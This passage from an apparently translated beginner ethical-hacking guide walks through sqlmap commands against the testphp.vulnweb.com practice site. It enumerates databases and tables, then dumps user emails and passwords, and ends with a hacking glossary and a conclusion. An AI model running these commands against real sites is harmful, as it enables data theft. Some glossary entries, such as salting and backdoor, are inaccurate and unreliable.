  ```\n\n无论你选择哪种方式，完成后，你都将看到 MySQL 数据库版本以及一些更有用的信息。\n\n你可能会发现 `sqlmap` 向你提出了一些问题，这些问题需要简单的是/否（yes/no）回答。输入\
  \ `y` 表示是，输入 `n` 表示否。以下是你可能会遇到的一些消息：\n\n- 一条提示数据库很可能是 MySQL，并询问 `sqlmap` 是否应该忽略其他测试仅进行\
  \ MySQL 测试。你的答案应是 `y`。\n- 一条消息询问是否应该使用某些 MySQL 版本的有效负载（payloads）。答案完全取决于情况，但如果你不确定，请回答\
  \ `y`。\n\n## 阐述 - 数据库\n\n接下来，我们将从数据库获取一些信息 - 名称、列名以及其他内容。\n\n### 第三步\n\n首先，我们需要获取所有可用数据库的名称，因此，在命令行提示符下输入：\n\
  \n```\nsqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -dbs\n```\n\n\
  你应该看到两个数据库，一个名为 `information schema`，另一个名为 `acuart`。\n\n### 表\n\n我们要的是 `acuart`\
  \ 数据库 - 另一个更像是一个默认数据库，会存在于每个目标上。它包含了数据库和表结构的细节，但对我们来说没有其他有用的信息，至少对于我们的目的而言不是。\n\n\
  ### 第四步\n\n现在我们需要告诉 `sqlmap` 我们想要哪个数据库，并要求它列出数据库表。在你的命令行提示符下输入：\n\n```\nsqlmap -u\
  \ http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -tables\n```\n\n你应该能看到一个表列表：\n\
  \nDatabase: acuart\n8 tables（8 个表）\n- artists\n- carts\n- categ\n- featured\n- guestbook\n\
  - pictures\n- products\n- users\n\n### 列\n\n我们可以通过几个额外的命令执行相同的操作来获取列列表。我们最感兴趣的表是名为\
  \ `users` 的那一个，因为它可能包含黑客想要的敏感信息，例如用户名和密码。在你的命令行提示符下输入：\n\n```\nsqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1\
  \ -D acuart -T users -columns\n```\n\n现在我们使用 `-D` 指定数据库，使用 `-T` 指定表，然后使用 `--columns`\
  \ 请求列。我希望你们现在已经开始掌握这种模式了。这里最吸引人的表是 `users`。它可能包含该网站上注册用户的用户名和密码（黑客总是会寻找敏感数据）。\n\n\
  最后的命令必须类似于这样——\n\n```\nsqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1\
  \ -D acuart -T users -columns\n```\n\n你应该会在屏幕上看到类似这样的内容：\n\nDatabase: acuart\nTable:\
  \ users\n8 columns（8 列）\n\n| Column（列） | Type（类型） |\n| :--- | :--- |\n| address\
  \ | mediumtext |\n| cart | varchar(100) |\n| cc | varchar(100) |\n| email | varchar(100)\
  \ |\n| name | varchar(100) |\n| pass | varchar(100) |\n| phone | varchar(100) |\n\
  | uname | varchar(100) |\n\n### 数据\n\n接下来，我们可以从这些列中获取想要的数据，这次我们要几列，而不仅仅是一列。列名在命令中必须用逗号隔开；在命令行提示符下输入此：\n\
  \n```\nsqlmap -u http://testphp.vulnweb.com/listproducts.php?cat=1 -D acuart -T\
  \ users -C email, name, pass --dump\n```\n\n结果应该是 John Smith，密码为 `test`，电子邮箱地址为\
  \ `email@email.com`??？没什么不起的，但如果你是在真实操作这些，你将会获得更多信息。\n\n你应该对这些信息做的是给网站管理员发送电子邮件，告诉他们他们的敏感数据存在漏洞，以及漏洞在哪里。不要掉入堕入黑暗的陷阱；监狱可不是好地方！\n\
  \n如果你觉得目前这些信息很有价值，请务必在 [Amazon 上留出五星反馈](https://www.amazon.com/dp/B07NSRW9FZ)\n\n\
  # 黑客术语表\n\n那些编写关于黑客的文章以及阅读这些文章的人所面临的最大挑战之一，就是了解相关的术语和词汇 - 而且术语非常多！准确性非常重要，在正确的位置使用正确的术语也是如此，因此，为了帮助你，我制作了一份你可能会遇到和/或作为道德黑客需要知道的术语列表。\n\
  \n## A\n\n### 归因 (Attribution)\n\n这是确定攻击背后的个人或多人的过程。这倾向于确定攻击的来源，由于黑客可以使用多层在线服务来隐藏自己的身份和位置，这非常困难。在很多情况下，入侵很难追溯到特定的个人。\n\
  \n## B\n\n### 后门 (Backdoor)\n\n当你通过正确的用户名和密码进入一个系统时，这就是后门。一些公司会留一个后门，以便黑客可以在不被察觉的情况下进入。这些后门可能会被利用。\n\
  \n### 黑帽 (Black hat)\n\n又被称为不道德的黑客，黑帽是指为了个人利益入侵系统并进行非法活动的人。\n\n### 僵尸网络 (Botnet)\n\
  \n僵尸网络，也被称为僵尸军，是一个所有计算机都被黑客控制的网络。黑客并不是购买所有这些计算机，而是利用恶意软件感染网络中的计算机，以便发动特定的攻击，例如 DDoS。你的系统可能是僵尸网络的一部分，而你可能永远都不知道。\n\
  \n### 暴力破解 (Brute force)\n\n暴力破解是破解密码最简单的方法之一。它是一种试错系统，使用词表列表来尝试正确的密码。如今，我们使用的加密系统倾向于减缓这些攻击，使得黑客在最短时间内尝试所有可能的组合变得困难得多，甚至是不可能的。\n\
  \n### 漏洞/缺陷 (Bug)\n\n每个人都听过 Bug；它是程序中某种描述的缺陷。有些没有害，而另一些则很容易被利用。苹果和谷歌等公司现在已经启动了漏洞赏计划，奖励那些发现并在黑客利用之前报告这些漏洞的人\
  \ - 这是你作为道德黑客赚取额外收入的一种方式。\n\n## C\n\n### 破解 (Cracking)\n\n描述未经授权进入安全系统的通用方式。然而，虽然“破解”和“破解者”这两个词已与“黑客”和“黑客”同义，但这具有误导性。黑客是一个倾向于钻研且并不总是不道德的人，而破解者通常带有恶意（尽管并不总是如此）。\n\
  \n### 加密 (Crypto)\n\n密码学的简写，这指的是隐藏消息和数据使其不可肉眼可见的方法。\n\n### 拆芯片攻击 (Chip-off)\n\n\
  拆芯片攻击是指黑客需要从计算机上物理移除内存芯片，以便可以使用特殊程序抓取信息。执法部门已使用这种攻击来访问受 PGP 保护的黑色手机信息。\n\n\n\n\n\
  \nDDoS 攻击在过去几年中变得非常流行，因为它们非常容易实施且效果立竿见影。它是分布式拒绝服务（Distributed Denial of Service），指的是黑客利用几台计算机向目标发送数据或数据请求，导致目标被淹没，从而使其变慢或完全崩溃。\n\
  \n## 深网\n有时，“深网”（deep web）和“暗网”（dark webs）被指代同一个东西，但它们是两个不同的概念。深网是另一部分，包含了未被 Google\
  \ 或其他搜索引擎索引的网站，包括付费网站、数据库、受密码保护的页面等。\n\n## 数字证书\n数字证书用于证明网站、个人或在线服务的身份。从更具技术性的角度来说，它们证明了某人、`etc.`\
  \ 拥有无法伪造的加密密钥。网站通常使用它们来确保你的访问是加密的，并且通常会在浏览器地址栏中以锁的形式显示。\n\n## E\n\n### 加密\n这是一个将消息或数据乱码以使其不可读的过程。它被公司、个人以及数字安全领域广泛使用。\n\
  \n### 端端加密\n一种特定的加密类型，数据或消息在的一端加密并在另一端解密。理论上，只有发送者和接收者可以读取它。\n\n### 恶毒女仆攻击 (Evil\
  \ maid attack)\n这是一种需要物理接触计算机的攻击，以便安装软件来跟踪用户并获取加密的敏感信息。\n\n### 漏洞利用 (Exploit)\n\
  漏洞利用是指利用应用程序或计算机中发现任何漏洞或缺陷的方法。并不是每个漏洞都能被利用，但在可以被利用的漏洞中，黑客会决定多种方法中的哪种是最好的。\n\n##\
  \ F\n\n### 取证\n在刑事取证中，通过一系列步骤来确定犯罪发生时发生了什么。在黑客领域，取证人员寻找的是数字指纹而非物理指纹。他们使用某些过程，尝试从计算机、手机、服务器\
  \ `etc.` 等设备中获取信息，这些设备被怀疑被黑客使用或滥用。\n\n## G\n\n### GCHQ\n美国国家安全局（NSA）的英国版本。GCHQ 代表政府通信总部，他们关注外国情报，特别是网络安全和恐怖主义威胁。他们还调查儿童色情交易。\n\
  \n## H\n\n### 黑客\n“黑客”一词已成为非法入侵系统或网络的同义词，但这是错误的。最初的黑客是为了学习而这么做，虽然现在有很多不择道德的黑客，但也有很多好人想要修复问题，让坏人无法进入。\n\
  \n### 黑客行动主义者 (Hacktivist)\n黑客行动主义者是指黑客技术进行政治用途的人。他们可能不会做大事；可能只是篡改政府公共网站，或者他们会大动作，从政府窃取敏感数据并发送给公民。匿名者（Anonymous）是最著名的黑客行动主义团体例子。\n\
  \n### 哈希处理 (Hashing)\n假设你有一个想要保密的密码或其他另一段文本。你可以将其保存在文件中并隐藏在计算机中，但如果黑客获取了它，他们就有了你的数据；这意味着对你来说是大麻烦。哈希是一种保持信息秘密的方法；它通过程序执行特定函数完成，结果是将原始信息隐藏在一串乱码中。组织经常用它来存储脸识别数据和密码，以使其更安全。\n\
  \n### HTTPS/SSL/TLS\nHTTPS 是超文本传输安全协议（Hypertext Transfer Protocol Secure）的缩写，这是用于控制跨互联网数据传输的框架。HTTP\
  \ 是普通版本，而 HTTPS 增加了一个额外的加密层，告诉你是该网站是安全的。HTTPS 使用 TLS 和 SSL 协议来保持连接安全，并证明该网站是真实的。\n\
  \n## I\n\n### 信息安全\n这是“information security”（信息安全）的缩写，通常被称为网络安全。\n\n## J\n\n###\
  \ 越狱 (Jailbreak)\n越狱是指绕过游戏主机或手机等设备的安全性，以突破制造商设置的限制。其目标通常是运行非官方软件。\n\n## K\n\n###\
  \ 密钥\n在现代密码学中使用了数字密钥。在 PGP 加密中，使用公密钥对消息加密，使用私密钥进行解密。其他系统可能有一个由所有相关方使用的单一密钥。无论哪种，如果黑客可以获取解锁或解密数据的密钥，他们就可以访问它。\n\
  \n## L\n\n### Lulz\nLOL 的在线版本，倾向于在不择道德或黑帽黑客群体之间使用。他们将其作为对公司或个人进行进行的攻击行为的合理化理由。\n\
  \n## M\n\n### 恶意软件 (Malware)\nMalware 通常是“恶意软件”的统称，指的是任何可能具有恶意、且纯粹为了攻击和破坏目标的程序或部分软件。流行的例子包括特木马、病毒、勒索软件、蠕虫、间谍软件、广告软件等。\n\
  \n### 中间攻击 (Man-in-the-middle)\n通常称为 MiTM，这类攻击非常常见，涉及黑客将自己置于两个用户之间并冒充他们的身份。有时黑客只会监听通信，但某些情况下，他们会参与并更改数据流以符合其目的。\n\
  \n### 元数据 (Metadata)\n这仅仅是“关于数据的数据”。例如，如果你发送了一封电子邮件，文本就是邮件内容，而发送者和接收者地址以及发送日期就是元数据。如果黑客能够获取足够的元数据，他们就能很容易发现一个人的身份和位置。\n\
  \n## N\n\n### NIST\nNIST 代表美国国家标准与技术研究院（National Institute of Standards and Technology），是美国商务部的一个部门，负责开发联邦政府使用的信息安全（InfoSec）标准。这意味着他们是应对现代威胁的最佳加密方法的权威机构。\n\
  \n### 随机数 (Nonce)\n“number”（数字）和“once”（一次性）的结合，字面意思是只使用一次的数字。Nonce 是系统生成的数字字符串，用于识别单次会话或任务的特定用户。一旦完成，该数字将不再再次使用。\n\
  \n## O\n\n### 运作安全 (OpSec)\n运作安全（Operational Security）的缩写，关于确保信息在在线和离线状态下秘密。它曾是一个军事术语，关乎识别需要保密的信息以及这些信息需要对谁隐藏。\n\
  \n### OTR\n如果一个人需要进行必须加密的对话，但需要快速完成，他们会使用一种名为 OTR 的协议。意思是“不记录”（off the record），它将为即时消息提供端到端加密。由于\
  \ PGP 主要用于电子邮件（每个人都有自己的密钥），而 OTR 会为每次相关的对话提供一个临时的密钥，使其免受黑客攻击。\n\n## P\n\n### 密码管理器\
  \ (Password managers)\n人们犯的最严重的错误是对所有账户都使用同一个密码，而且通常这密码本身也不是一个非常好的密码。黑客只需要获取你其中一个账户的访问权限，就可以进入所有账户。然而，尝试记住几十个不同的密码并不容易，这正是密码管理器的用场。这是一种跟踪你所有密码的软件，在需要时甚至可以生成复杂且很长的密码。你唯一需要记住密码的是进入密码管理器的主密码。\n\
  \n### 渗透测试 (Penetration testing)\n\n\n\n\n\n这通常被称为渗透测试（pen-testing），是一个测试系统以检查是否存在安全漏洞的过程。基本上，渗透测试人员会使用与黑客客相同的方法来进入系统并寻找弱点。他们要么会修复这些漏洞，要么将它们报告给系统所有者。\n\
  \n### PGP\n\n`PGP` 代表“良好的隐私保护”（pretty good privacy），它是用于数据加密的方法之一。它通常用于电子邮件，任何拦截这些数据的人看到的都只有乱码。`PGP`\
  \ 利用了非对称加密；这意味着发送者使用公钥对信息进行乱码，而接收者则使用私钥进行解密。这项技术已有 20 多年的历史，它仍然是最强大的加密方法之一，尽管使用起来非常困难。\n\
  \n### 钓鱼（Phishing）\n\n这是一种社会工程学，并不是真正的黑客攻击。攻击者会试图从目标那里获取某些信息，这些信息他们可能在日后使用。他们通过假装成\
  \ Facebook、Google 甚至受害者使用的手机运营商的客服人员来实现这一点。他们可能会要求目标点击消息或电子邮件中的链接（恶意链接），或通过电子邮件发送密码等信息。通常，攻击者会发送数千封邮件，希望能获得一两个回信；但有时他们会有更特定的目标，使用一种名为“鱼叉式钓鱼攻击”（spear\
  \ phishing）的手段。\n\n### 明文（Plaintext）\n\n顾名思，这就是未经加密的纯文本，就像你在这里阅读的内容一样，有时被称为明文（cleartext）。一些安全措施不良的公司会以明文存储密码和其他敏感数据，这使得黑客极易入侵并窃取它们。\n\
  \n### Pwned\n\n这是电脑极客用来代替动词“own”（拥有/击败）的术语。例如，如果一个玩家在视频游戏中击败了另一个玩家，他会说他“pwned”了对方。这在黑客术语中的意思非常相似，但黑客不是在玩游戏，而是获取他人网络或计算机的访问权限。\n\
  \n## R\n\n### RAT\n\n这是远程访问工具（Remote Access Tool）或有时称为远程访问木马（Remote Access Trojan）的缩写。当它们被用作恶意软件时，是一个非常可怕的前景；任何能在你的电脑上植入\
  \ `RAT` 的攻击者都有潜力接管你的机器。最糟糕的是，这些工具可以在互联网地下世界购买或免费获得，这意味着即使是完全没有技术的黑客也可以使用。\n\n###\
  \ 勒索软件（Ransomware）\n\n这类恶意软件一旦被安装，就会锁定计算机并让你无法访问自己的文件。屏幕会显示一条消息，告诉你需要向黑客发送特定金额的资金，并提供支付地址；这通常要求用比特币支付。随着越来越多的黑客这么做，这已经变成了一种流行病现象；许多人乐意支付赎金以换回自己的电脑。\n\
  \n### 彩虹彩表（Rainbow table）\n\n这是黑客使用的较复杂的技术之一，用于猜测隐藏在哈希中的密码。\n\n### 红队（Red team）\n\
  \n一些组织会聘佣若干黑客组成一个“红队”。这样做是为了发现他们系统中的漏洞，团队会对系统进行一系列攻击，试图完全接管它。这是伦理黑客攻击的最佳体现，因为组织可以在未经授权的人进入之前修复漏洞。\n\
  \n### Root（根）\n\n在几乎所有的计算机系统中，“root”都是具有最高权限的账户。\n\n### Rootkit（根内核）\n\nRootkits\
  \ 是深留在系统内部的特定恶意软件。它们很难被检测，并且可以从外部或内部执行。\n\n## S\n\n### 加盐（Salting）\n\n加盐是指黑客向密码中添加额外数据，使其更难破解。\n\
  \n### 脚本小子（Script kiddies）\n\n这是一个用来描述缺乏技术专长并使用现有工具的黑客的术语。\n\n### Shodan\n\n`Shodan`\
  \ 是一个搜索设备的搜索引擎。它经常被用于不道德的目的。\n\n### 签名（Signature）\n\n这是一种用于验证信息真实性的数字签名。\n\n###\
  \ 侧信道攻击（Side channel attack）\n\n你的计算机及其组成的所有硬件都会发出持续的信号流。侧信道被发现计算机正在执行的操作模式。\n\n\
  ### 嗅探（Sniffing）\n\n嗅探是一种使用特殊软件拦截网络数据的方法。一旦收集到数据，嗅探器就会对其筛选。\n\n### 社会工程学（Social\
  \ engineering）\n\n并不是所有的黑客都整天盯着满绿色文字的屏幕！有时，访问系统最简单的方法是拨电话或发送电子邮件，假装成另一个人。\n\n\n\n\
  \n\n想象你正在下一场国际象棋。现在轮到你走了，你正在努力地思考对手可能采取的行动，尽可能地往后看。你的皇后得到完全保护了吗？你是否让你的国王暴露在受攻击的风险？这就是安全研究人员在设计威胁模型时的工作。威胁模型是一个术语，用于描述黑客拥有什么能力、你需要防范什么，以及系统的漏洞。例如，如果你是一个想要保护系统免受国家级攻击小组的活动人士，你需要确保它足够强大；而如果你只是在保护你位于偏远林间小木小屋的网络，虽然它也需要安全，但工作不会那么艰难。\n\
  \n## Token\n`token`（令牌）是一种物理设备，赋予所有者对某些服务进行验证或登录的能力。例如，`token`可以提供密码之外的安全性。其背后的原理是，如果密码或加密密钥被盗，没有物理\
  \ `token`，黑客就无法进入。\n\n## Tor\nTor 代表 `The Onion Router`（洋葱路由）。它由美国海军研究实验室开发，现在被黑客、一些记者和活动人士用来隐藏他们的在线活动，从而实现匿名化。其核心思想是网络上有一系列计算机，它们会将你的流量带入奇特的之旅，以隐藏你的真实位置。Tor\
  \ 网络由志愿者运行，是一个非盈利项目的一部分。\n\n## Tails\n这是 `The Amnesic Incognito Live System`（遗忘匿名现场系统）的缩写，爱德华·斯诺登支持的操作系统。作为一个遗忘系统，你的计算机不会记住任何信息，每当你启动时，它就像在使用一个完全全新的系统一样。它是免费且开源的，但它也有一些安全缺陷。\n\
  \n## V\n### Verification (dump)\n验证（导出）是安全研究人员和记者用于对被黑数据进行软处理的过程，以确保它是合法数据。这一过程对于确保数据确实是真实的，以及匿名黑客所提出的声明是真实而非仅仅是暗网欺骗用户的手段至关重要。\n\
  \n### VPN\n`VPN` 是 `Virtual Private Network`（虚拟专用网络），它们利用加密方法将你安全、私地连接到互联网，而不泄露你的身份和真实位置。它们不仅被想要保护连接的人使用；有时员工会使用它们远程连接到雇主使用的网络，并通过位于世界其他地方的服务器进行连接转发。\n\
  \n### Virus\n`virus`（病毒）是一种隐藏在文件或程序中的计算机恶意软件。虽然 `worm`（蠕虫）可以自我传播，但 `virus` 需要人工干预，*即*转发一封被感染的邮件*。`virus`\
  \ 可以嵌入到计算机中，并以你能想象的任何方式窃取、删除、加密或以其他弄乱数据。\n\n### Vuln\n`vulnerability`（漏洞）的缩写，这只是对黑客可以利用的缺陷或错误的的一种称呼。\n\
  \n## W\n### Warez\n读作“where is”，指的是被盗版的软件，并通常通过 `Usenet`、`BitTorrent` 以及其他类似技术分发。`warez`\
  \ 往往充满了恶意软件，利用了一些人想要免费获取软件的固有欲望。\n\n### White hat\n白帽黑客，一种道德黑客，他们发现系统中的漏洞，目标是修复漏洞并保护系统免受黑帽黑客的攻击。\n\
  \n### Worm\n蠕虫（Worm），一种可以自我复制并在计算机之间传播的恶意软件。与 `virus` 不同，它不需要人类之手的帮助。\n\n## Z\n\
  ### Zero-day\n有时被称为 `0day`（零日漏洞），这是软件供应商未察觉或尚未修复的漏洞。该名称源于从发现漏洞到首次利用该漏洞之间有 0 天的间隔。这些是最珍贵的漏洞，因为还没有部署修复程序，而且它们几乎可以保证处于可用工作状态。\n\
  \n# 结论\n感谢阅读我的指南，希望你发现它对你有帮助，并且你现在对道德黑客及其本质有了更多的了解。书中的实际示例并不复杂；它们是为像你这样的初学者设计的，作为一种向你介绍该主题并让你习惯操作的方法。\n\
  \n你的下一步是进一步学习。有很多在线课程和教程，更不用说满是有用书籍的图书馆，你可以利用它们来加深理解并提高知识。\n\n我必须说，你**不要**以不道德或非法的方式使用你学到的任何内容。道德黑客背后的理念是：1)\
  \ 帮助你学习如何保持自己的系统安全；2) 当你决定将道德黑客作为职业时，让你对预期有所了解。\n\n如果你喜欢这个指南，请在 [Amazon](https://www.amazon.com/dp/B07NSRW9FZ)\
  \ 上给我留评价，祝你在成为顶尖道德黑客的旅途中好运。\n\n## 参考文献\n- [`staysafeonline.org`](https://staysafeonline.org/)\n\
